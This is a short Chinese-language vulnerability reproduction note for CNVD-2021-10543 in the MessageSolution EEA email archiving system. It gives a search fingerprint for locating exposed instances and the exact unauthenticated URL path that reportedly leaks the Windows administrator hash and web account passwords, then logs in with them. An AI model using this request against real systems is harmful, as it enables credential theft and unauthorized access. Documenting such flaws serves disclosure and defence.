# MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543

## 漏洞描述

MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码

## 漏洞影响

<a-checkbox checked>MessageSolution 企业邮件归档管理系统EEA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="MessageSolution Enterprise Email Archiving (EEA)"</a-checkbox></br>

## 漏洞复现

登录页面如下

![img](../../../.vuepress/public/img/mess-1.png)



访问如下Url

```plain
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
```

![img](../../../.vuepress/public/img/mess-2.png)



使用获得到的密码可以登录系统

![img](../../../.vuepress/public/img/mess-3.png)